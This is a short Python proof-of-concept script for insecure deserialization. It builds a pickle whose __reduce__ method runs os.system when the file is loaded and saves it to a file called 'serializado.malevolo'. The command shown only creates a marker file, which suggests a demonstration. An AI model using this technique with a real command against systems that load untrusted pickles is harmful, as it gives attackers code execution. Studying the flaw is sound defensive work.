import pickle
import os

class Muajaja(object):
    def __reduce__(object):
        command = 'touch EXPLOIT-MUAJAJAJA'
        return (os.system, (command,))

serializado = pickle.dumps(Muajaja())

nombre_archivo = 'serializado.malevolo'

with open(nombre_archivo, 'w') as archivo_serializado:
    archivo_serializado.write(serializado)